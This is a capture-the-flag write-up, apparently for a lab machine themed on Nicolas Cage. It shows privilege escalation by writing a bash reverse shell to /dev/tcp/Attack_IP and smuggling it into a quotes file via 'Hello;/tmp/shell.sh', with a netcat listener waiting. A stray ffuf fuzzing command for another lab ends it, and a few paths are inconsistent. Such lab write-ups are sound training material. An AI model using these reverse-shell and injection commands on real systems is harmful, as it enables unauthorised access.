Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!  
One. Revamp the website  
Two. Put more quotes in script  
Three. Buy bee pesticide  
Four. Help him with acting lessons  
Five. Teach Dad what "information security" is.  
  
In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes

 Used **find / -type f -user** cage **2>/dev/null** to discover files that have **cage** as a characteristic.

weston@national-treasure:/home$ **find / -type f -user** cage **2>/dev/null**  
/opt/.dads_scripts/spread_the_quotes.py  
/opt/.dads_scripts/.files/.quotes

— Used **cat** to view **/opt/.dads_scripts/spread_the_quotes.py**. It calls **/opt/.dads_scripts/files/.quotes** choosing randomly a quote.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*0JGj4FhwgVCALXiMjoup-w.png)

— Used **cat** to view **opt/.dads_scripts/.files/.quotes**.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*7yZvVzHpqlxxdiZmEBn59Q.png)

— Decided to use **echo** to insert a payload into **/opt/.dads_scripts/files/.quotes**.

**weston**@national-treasure:~$ **cat > /tmp/**shell.sh **<< EOF  
> #!/bin/bash  
> bash -i >& /dev/tcp/**Attack_IP**/**Attack_IP **0>&1  
> EOF**  
...  
weston@national-treasure:~$ **chmod +x /tmp/**shell.sh  
weston@national-treasure:~$ **cat /tmp/**shell.sh  
#!/bin/bash  
bash -i >& /dev/tcp/Attack_IP/Attack_Port 0>&1  
weston@national-treasure:~$ **printf '**Hello**;/tmp/**shell.sh**\n' > /opt/.dads_scripts/.files/.quotes**  
                                                                                 
Broadcast message from cage@national-treasure (somewhere) (Wed Feb 26 ...  
                                                                                 
Hello

— Set up a listener using **netcat** before using the previous **printf** command line.

:~/BreakOutTheCage# **nc -lnvp 4444**


ffuf -u 'http://moebius.thm/album.php?short_tag=FUZZ' -w /usr/share/wordlists/SecLists/Fuzzing/special-chars.txt -mr 'Hacking attempt'